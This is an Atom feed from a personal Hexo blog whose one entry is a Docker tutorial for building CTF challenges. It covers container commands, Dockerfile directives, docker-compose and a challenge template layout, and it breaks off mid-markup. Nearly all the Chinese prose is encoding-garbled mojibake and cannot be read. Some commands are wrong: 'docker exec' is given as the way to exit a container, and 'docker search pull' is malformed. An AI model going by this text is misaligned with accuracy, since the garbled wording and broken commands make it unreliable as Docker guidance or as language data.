<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åˆé›¶Â·b10g~ğŸ¥</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2023-07-27T15:25:50.317Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å…³äºä½¿ç”¨dockerçš„ä¸€äº›æ„Ÿæƒ³ï¼ŒæŒç»­æ›´æ–°ä¸­...</title>
    <link href="https://bowuchuling.github.io/posts/7ea82466.html"/>
    <id>https://bowuchuling.github.io/posts/7ea82466.html</id>
    <published>2023-07-26T17:10:39.718Z</published>
    <updated>2023-07-27T15:25:50.317Z</updated>
    
    <content type="html"><![CDATA[<p>dockeræ•™ç¨‹å…¶å®å¾ˆæ—©å°±åœ¨é…é…¿äº†ï¼Œä½†å› ä¸ºè‡ªå·±å¤©èµ‹ä¸é«˜ï¼Œæä¸æ˜ç™½ï¼Œä¸€ç›´æ²¡æœ‰å‡ºï¼Œè¿‘æœŸç”±äºæœ‰å‡ºé¢˜éœ€æ±‚ï¼Œä¸å¾—ä¸åˆæ‹¾èµ·vmé‡Œè—ç°äº†çš„dockerï¼Œåˆæ·±å…¥å­¦ä¹ äº†ä¸€ç•ªï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æåˆ°ç½‘ä¸Šçš„å„ç§åšå®¢ï¼Œçœ‹äº†å¥½é•¿æ—¶é—´éƒ½çœ‹ä¸æ‡‚ï¼Œæµªè´¹äº†å¤§æŠŠæ—¶é—´ï¼Œç”±æ­¤è¢«æˆ‘æˆäºˆäº†æ— è‰¯åšå®¢çš„å¤´è¡”ã€‚è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯ä»‹ç»ä¸€ä¸‹CTFä¸­å‡ºé¢˜æ‰€éœ€è¦çš„dockeræ“ä½œã€‚æŒç»­æ›´æ–°ä¸­â€¦â€¦</p><h2 id="dockeré…ç½®æ•™ç¨‹">dockeré…ç½®æ•™ç¨‹</h2><h3 id="æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰">æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰</h3><p><strong>é€‰æ‹©æ€§æ›´æ¢ï¼Œå¦‚æœå†è¿›è¡Œä¸‹é¢æŒ‡ä»¤æ—¶æ²¡æœ‰æŠ¥é”™ï¼Œå¯ä»¥é€‰æ‹©ä¸æ›´æ¢</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/source<span class="selector-class">.list</span>   <span class="comment">//æ‰“å¼€å­˜æºæ–‡ä»¶</span></span><br><span class="line"><span class="selector-tag">i</span>                               <span class="comment">//è¿›å…¥ç¼–è¾‘æ¨¡å¼</span></span><br><span class="line">å°†åœ°å€é»è´´è¿›å»</span><br><span class="line">æŒ‰ESC                           <span class="comment">//é€€å‡ºç¼–è¾‘æ¨¡å¼</span></span><br><span class="line">è¾“å…¥:wq                         <span class="comment">//ä¿å­˜å¹¶é€€å‡º</span></span><br></pre></td></tr></table></figure><p><strong>é•œåƒæºåœ°å€ï¼Œå…¨éƒ¨å¤åˆ¶è¿›å»</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºdocker">åˆ›å»ºdocker</h3><p><strong>1.ä¸‹è½½dockeré•œåƒ</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> docker.io    </span><br></pre></td></tr></table></figure><p><strong>2.æœç´¢\ä¸‹è½½ æœåŠ¡å™¨é•œåƒ</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search pull   <span class="regexp">//</span>æœç´¢æœåŠ¡å™¨é•œåƒï¼Œå¯ä»¥ä¸æœ</span><br><span class="line">docker pull é•œåƒå    <span class="regexp">//</span>ä¾‹å¦‚docker pull tutum/lamp </span><br></pre></td></tr></table></figure><p><strong>3.åˆ›å»ºdocker</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name ç»™dockerå–ä¸ªå -p æƒ³å¼€æ”¾çš„ç«¯å£:80 æœåŠ¡å™¨é•œåƒå</span></span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name dockername1 -p 180:80 tutum/lamp</span></span><br><span class="line">//åˆ›å»ºtutum/lampæœåŠ¡å™¨ï¼Œå‘½åä¸ºdockername1ï¼Œå¼€æ”¾<span class="number">180</span>ç«¯å£ä¾›è®¿é—®</span><br></pre></td></tr></table></figure><p><strong>4.æ™®é€šé¢˜ç›®å¤åˆ¶</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŠŠæ–‡ä»¶æ‹‰åˆ°linuxç›®å½•ä¸‹</span><br><span class="line">docker cp æ–‡ä»¶å dockerå<span class="symbol">:/var/www/html</span>   /<span class="regexp">/æŠŠæ–‡ä»¶å¤åˆ¶åˆ°dockerçš„/var</span><span class="regexp">/www/html</span>ç›®å½•ä¸‹ï¼Œè®°å¾—å‘½åä¸€ä¸ªindex.phpï¼Œæ–‡ä»¶çš„å…¶ä»–äººæƒé™å¾—è®¾ç½®æˆå¯è¯»</span><br></pre></td></tr></table></figure><p><strong>5.ï¼ˆå¯æœ‰å¯æ— ï¼‰è¿›å…¥dockeræŸ¥çœ‹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it dockerå <span class="regexp">/bin/</span>bash  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>è¿›å…¥ä¹‹åå°±éšä¾¿å‘½ä»¤æ‰§è¡Œå°±å¥½äº†ï¼Œæ²¡é—®é¢˜å°±è®¿é—®å®¿ä¸»æœºip+ç«¯å£çœ‹çœ‹ï¼Œèƒ½è®¿é—®å°±æ²¡é—®é¢˜</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æŒ‡ä»¤">å¸¸ç”¨æŒ‡ä»¤</h3><p><strong>æŸ¥çœ‹dockerå®¹å™¨çŠ¶æ€</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps  </span></span><br><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><strong>æ–°å»ºdockerå®¹å™¨</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span> -id --name èµ·ä¸ªå -p å¼€æ”¾ç«¯å£:æ˜ å°„ç«¯å£ tutum/lamp</span><br><span class="line"><span class="meta">#æ˜ å°„ç«¯å£å‰é¦–å…ˆç¡®å®šç«¯å£æ²¡æœ‰è¢«å ç”¨</span></span><br><span class="line"><span class="meta">#-d <span class="comment">//å®¹å™¨åå°è¿è¡Œã€‚</span></span></span><br><span class="line"><span class="meta">#-p <span class="comment">//æŒ‡å®šæ˜ å°„ç«¯å£ã€‚</span></span></span><br><span class="line"><span class="meta">#-P <span class="comment">//éšæœºæ˜ å°„é«˜ç«¯å£</span></span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9999</span>:<span class="number">80</span> tutum/lamp</span><br></pre></td></tr></table></figure><p><strong>å¤åˆ¶æ–‡ä»¶è¿›å…¥docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp [æœ¬åœ°è·¯å¾„] [container id]<span class="symbol">:</span>[container è·¯å¾„]</span><br><span class="line">ä¾‹å¦‚:</span><br><span class="line">docker cp flag.php dockeråå­—<span class="symbol">:/var/www/html</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥è¯¢å®¿ä¸»æœºip</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥æŒ‡å®šdocker</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it dockeråå­— <span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="meta">#å¦‚æœä»è¿™ä¸ªå®¹å™¨é€€å‡ºï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ï¼Œæ¨èä½¿ç”¨ docker exec</span></span><br><span class="line"><span class="meta">#-i <span class="comment">//è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚</span></span></span><br><span class="line"><span class="meta">#-t <span class="comment">//è®©dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å‡ºä¸Šã€‚</span></span></span><br></pre></td></tr></table></figure><p><strong>é€€å‡ºå½“å‰dockerå®¹å™¨</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p><strong>å¯¼å‡ºå®¹å™¨</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">docker</span> ex<span class="keyword">port</span> [dockerID] &gt; Find.tar</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨å®¹å™¨</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> å®¹å™¨ID</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ‰€æœ‰å­˜åœ¨çš„å®¹å™¨</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> <span class="keyword">ls</span> -a</span><br></pre></td></tr></table></figure><p><strong>åˆ é™¤å®¹å™¨</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [<span class="built_in">container</span> id]æˆ–è€…æ˜¯[<span class="built_in">container</span> name]</span><br><span class="line"><span class="meta">#éœ€è¦å…ˆæŠŠå®¹å™¨åœæ‰</span></span><br></pre></td></tr></table></figure><h2 id="æ¨¡æ¿ä»‹ç»">æ¨¡æ¿ä»‹ç»</h2><p>ååˆ†æ„Ÿè°¢nssçš„å¸ˆå‚…æä¾›çš„æ¨¡æ¿å•¦ï¼Œè¿™é‡Œé™„ä¸Šé“¾æ¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CTF-Archives/</span>ctf-docker-template</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜">åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜</h2><p>è¿™é‡Œæ„Ÿè°¢f12å¤§ä½¬æä¾›çš„å¸®åŠ©</p><h3 id="è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ">è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸¤ä¸ªä¸ªæ¦‚å¿µ;</p><p>ï¼ˆ1ï¼‰é•œåƒï¼š<br>ä»€ä¹ˆæ˜¯é•œåƒï¼Ÿå½“æˆ‘ä»¬åœ¨è™šæ‹Ÿæœºå¯åŠ¨dockeråï¼Œè¿è¡Œdocker imagesï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„å°±æ˜¯æˆ‘ä»¬dockeré‡Œæ‰€æ‹¥æœ‰çš„é•œåƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/eb83d995c2a91cec54d44f0f93191b9.png" alt=""></p><p>ä¸Šé¢çš„äº”åˆ—ä¾æ¬¡æ˜¯ é•œåƒåç§°  é•œåƒæ ‡ç­¾  é•œåƒid  é•œåƒåˆ›å»ºæ—¶é—´  é•œåƒå¤§å°</p><p>ï¼ˆ2ï¼‰å®¹å™¨ï¼š</p><p>é•œåƒæ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„å‘¢ï¼Ÿå½“ç„¶æ˜¯åˆ›å»ºå®¹å™¨å•¦ï¼Œå½“æˆ‘ä»¬è¾“å…¥docker ps(æŸ¥çœ‹åœ¨è¿è¡Œçš„å®¹å™¨)æˆ–è€…docker ps -a(æŸ¥çœ‹æ‰€æœ‰å®¹å™¨)å°±å¯ä»¥çœ‹åˆ°å®¹å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b0e20b86ca59ba33927055323c6f6c1.png" alt=""></p><p>äº†è§£äº†è¿™äº›åŸºç¡€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­ä¸‹é¢çš„å†…å®¹äº†</p><h4 id="å…ˆä»‹ç»dockerfile"><strong>å…ˆä»‹ç»dockerfile:</strong></h4><p>dockerfileå°†ä¸€äº›éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­,åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œã€‚æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶æï¼Ÿè¿™ä¸ªæ—¶å€™å°±è¦æåˆ°docker builidè¿™ä¸ªæŒ‡ä»¤äº†ï¼Œä½¿ç”¨æ ¼å¼å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="tag">&lt;<span class="name">é•œåƒåç§°</span>&gt;</span>:<span class="tag">&lt;<span class="name">é•œåƒæ ‡ç­¾</span>&gt;</span> <span class="tag">&lt;<span class="name">ä¸Šä¸‹æ–‡è·¯å¾„</span>&gt;</span></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">docker build -t sql:v1 .</span><br><span class="line">è¿™é‡Œçš„.æ˜¯å½“å‰ç›®å½•çš„æ„æ€ï¼Œè¿™ä¸»è¦æ˜¯ç»™dockerä¸€ä¸ªå¼•ç”¨è·¯å¾„ï¼Œå‘Šè¯‰dockerä½ éœ€è¦çš„æ–‡ä»¶éƒ½åœ¨å½“å‰ç›®å½•ä»¥åŠå…¶å­ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè¯¥å‘½ä»¤ä¼šè‡ªåŠ¨æœç´¢.åŠå…¶å­ç›®å½•ä¸‹çš„åä¸ºdockerfileçš„æ–‡ä»¶</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f è·¯å¾„</span></span><br><span class="line">æ­¤æ–¹æ³•å¯ä»¥æŒ‡å®šæ–‡ä»¶ä½œä¸ºdockerfileä½¿ç”¨</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142%5Ev91%5EinsertT0,239%5Ev3%5Einsert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187</a></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/17c52f8981f341a48dc82ab82918461e.png" alt=""></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b370884a35ec495dbe708fd704598e9b.png" alt=""></p><p><strong>å¯¹äºä»¥ä¸‹ä»£ç çš„ç†è§£å¯ä»¥å‚è€ƒNSSçš„æ¨¡æ¿web-nginx-mysql-php73ï¼Œé™„ä¸Šæˆªå›¾</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727231741.png" alt=""></p><h5 id="FROM">FROM</h5><p>æŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span></span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span>:<span class="symbol">&lt;tag&gt;</span></span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span>@<span class="symbol">&lt;digest&gt;</span></span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹ï¼šã€€ã€€</span><br><span class="line">FROM mysq<span class="variable">l:5</span>.<span class="number">6</span></span><br><span class="line">æ³¨ï¼š</span><br><span class="line">   <span class="keyword">tag</span>æˆ–digestæ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸ä½¿ç”¨è¿™ä¸¤ä¸ªå€¼æ—¶ï¼Œä¼šä½¿ç”¨latestç‰ˆæœ¬çš„åŸºç¡€é•œåƒ</span><br></pre></td></tr></table></figure><h5 id="RUN">RUN</h5><p>æ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span>ç”¨äºåœ¨æ„å»ºé•œåƒæ—¶æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æœ‰ä»¥ä¸‹ä¸¤ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š</span><br><span class="line"><span class="keyword">shell</span>æ‰§è¡Œ</span><br><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> &lt;command&gt;</span><br><span class="line">execæ‰§è¡Œ</span><br><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">    <span class="keyword">RUN</span> apk <span class="keyword">update</span></span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">æ³¨ï¼š<span class="keyword">RUN</span>æŒ‡ä»¤åˆ›å»ºçš„ä¸­é—´é•œåƒä¼šè¢«ç¼“å­˜ï¼Œå¹¶ä¼šåœ¨ä¸‹æ¬¡æ„å»ºä¸­ä½¿ç”¨ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨è¿™äº›ç¼“å­˜é•œåƒï¼Œ</span><br><span class="line">å¯ä»¥åœ¨æ„å»ºæ—¶æŒ‡å®š--<span class="keyword">no</span>-cacheå‚æ•°ï¼Œå¦‚ï¼šdocker build --<span class="keyword">no</span>-cache</span><br></pre></td></tr></table></figure><h5 id="ADD">ADD</h5><p>å°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼Œtarç±»å‹æ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹(ç½‘ç»œå‹ç¼©èµ„æºä¸ä¼šè¢«è§£å‹)ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œèµ„æºï¼Œç±»ä¼¼wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="built_in">ADD</span> &lt;src&gt;<span class="built_in">..</span>. &lt;dest&gt;</span><br><span class="line">    <span class="built_in">ADD</span> [<span class="string">&quot;&lt;src&gt;&quot;</span>,<span class="built_in">..</span>. <span class="string">&quot;&lt;dest&gt;&quot;</span>] ç”¨äºæ”¯æŒåŒ…å«ç©ºæ ¼çš„è·¯å¾„</span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="built_in">ADD</span> hom* /mydir/          # æ·»åŠ æ‰€æœ‰ä»¥<span class="string">&quot;hom&quot;</span>å¼€å¤´çš„æ–‡ä»¶</span><br><span class="line">    <span class="built_in">ADD</span> hom?.txt /mydir/      # ? æ›¿ä»£ä¸€ä¸ªå•å­—ç¬¦,ä¾‹å¦‚ï¼š<span class="string">&quot;home.txt&quot;</span></span><br><span class="line">    <span class="built_in">ADD</span> test relativeDir/     # æ·»åŠ  <span class="string">&quot;test&quot;</span> åˆ° `WORKDIR`/relativeDir/</span><br><span class="line">    <span class="built_in">ADD</span> test /absoluteDir/    # æ·»åŠ  <span class="string">&quot;test&quot;</span> åˆ° /absoluteDir/</span><br></pre></td></tr></table></figure><h5 id="COPY">COPY</h5><p>åŠŸèƒ½ç±»ä¼¼ADDï¼Œä½†æ˜¯æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æº</p><h5 id="CMD">CMD</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼˜å…ˆ)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (è®¾ç½®äº†ENTRYPOINTï¼Œåˆ™ç›´æ¥è°ƒç”¨ENTRYPOINTæ·»åŠ å‚æ•°)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">command</span> param1 param2 (æ‰§è¡Œshellå†…éƒ¨å‘½ä»¤)</span></span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">æ³¨ï¼š<span class="keyword">CMD</span><span class="language-bash">ä¸åŒäºRUNï¼ŒCMDç”¨äºæŒ‡å®šåœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€ŒRUNç”¨äºæŒ‡å®šé•œåƒæ„å»ºæ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><strong>docker-compose:</strong></h4><p>docker-compseåƒæ˜¯ä¸€ä¸ªä¸­æ§ç³»ç»Ÿï¼Œä»–å¯ä»¥æ§åˆ¶ç”±ä»–å¯åŠ¨çš„æ‰€æœ‰å®¹å™¨ï¼ŒåŒæ—¶å¯åŠ¨ã€åŒæ—¶å…³é—­ã€åŒæ—¶åˆ é™¤ç­‰ï¼Œå‘½åä¸€èˆ¬ä¸ºxxxxx.yamlï¼Œå†…å®¹æ ¼å¼å¦‚ä¸‹ï¼Œä»¥NSSæ¨¡æ¿web-nginx-mysql-php73ä¸ºä¾‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727224529.png" alt=""></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é‡ç‚¹å…³æ³¨serviceséƒ¨åˆ†ï¼Œç¼©è¿›ä¸€æ¬¡çš„webå’Œwwwä¸ºé•œåƒåï¼Œç¼©è¿›ä¸¤æ¬¡çš„ä¸ºå®¹å™¨å‚æ•°ï¼Œä¾‹å¦‚å¼€æ”¾ç«¯å£ã€æ˜ å°„ç«¯å£ã€å®¹å™¨åã€å¯åŠ¨çš„dockerfileä½ç½®ï¼ˆ<span class="keyword">build</span>å‚æ•°ï¼‰ï¼Œè¿™æ ·å¯ä»¥å®ç°åŒæ—¶å¯åŠ¨å¤šä¸ªä¸åŒå®¹å™¨ã€‚</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œ</span><br><span class="line">docker-compose <span class="keyword">up</span> -d</span><br></pre></td></tr></table></figure><h4 id="å‡ºé¢˜å»ºè®®-web-nginx-mysql-php73">å‡ºé¢˜å»ºè®®(web-nginx-mysql-php73)</h4><h5 id="åŸºæœ¬æ¡†æ¶"><strong>åŸºæœ¬æ¡†æ¶</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ docker</span><br><span class="line">â”‚   â””â”€â”€ docker-compose<span class="selector-class">.yml</span></span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ db<span class="selector-class">.sql</span></span><br><span class="line">â”œâ”€â”€ service</span><br><span class="line">â”‚   â””â”€â”€ docker-entrypoint<span class="selector-class">.sh</span></span><br><span class="line">â””â”€â”€ <span class="attribute">src</span></span><br><span class="line">â”œâ”€â”€ shell<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ index<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ flag<span class="selector-class">.php</span></span><br><span 